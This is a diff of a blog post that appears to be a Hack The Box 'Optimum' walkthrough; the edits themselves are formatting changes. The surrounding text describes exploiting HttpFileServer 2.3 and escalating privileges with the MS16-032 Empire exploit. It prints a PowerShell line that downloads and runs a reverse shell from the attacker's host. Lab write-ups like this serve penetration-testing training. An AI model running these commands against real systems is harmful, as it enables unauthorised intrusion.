@@ -2,13 +2,13 @@
 title: Hack The Box - Optimum
 date: 2022-01-7 12:10:00
 categories: [hackthebox]
-tags: [windows]
+tags: [windows,easy,cve,metasploit]
 math: true
 mermaid: true
 toc: true
 comments: true
 ---
-
+![](/assets/Hackthebox/Optimum/0.png)
 
 ## RECON
 
@@ -33,7 +33,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 tried some common credentials but did not work on the login portal.
 
-### Searchsploit
+### SEARCHSPLOIT
 A quick look on `searchsploit` shows that it is vulnerable to `remote code execution`  as it is running on `version 2.3`
 ```
 #searchsploit HttpFileServer 
@@ -212,7 +212,7 @@ once the exploit completes we are prompt with the system shell.
 
 ## SHELL AS KOSTAS
 
-### Method 2 - without metasploit
+### Method 2 - Without Metasploit
 ### Exploit Analysis
 Going back to the exploit we found earlier using searchsploit.
 
@@ -263,7 +263,7 @@ optimum\kostas
 ```
 
 ### SHELL AS SYSTEM
-Using Sherlock[https://github.com/rasta-mouse/Sherlock]: 
+Using [Sherlock](https://github.com/rasta-mouse/Sherlock): 
 PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.
 
 we will now host `sherlock.ps1` using `smbserver` .
@@ -370,12 +370,12 @@ VulnStatus : Not Vulnerable
 it shows three vulnerabilities MS16-032, MS16-034, and MS16-135.
 
 ### MS16-032
-Using `empire` privesc exploit 
+Using `empire` privesc exploit. 
 we’ll download a copy of that, and add a line at the end to call it with a command to download and execute our reverse shell:
 ```
 Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.22/rev.ps1')"
 ```
-Hosting our Invoke-MS16032.ps1 and rev.ps1
+Hosting our `Invoke-MS16032.ps1` and `rev.ps1`
 ```
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
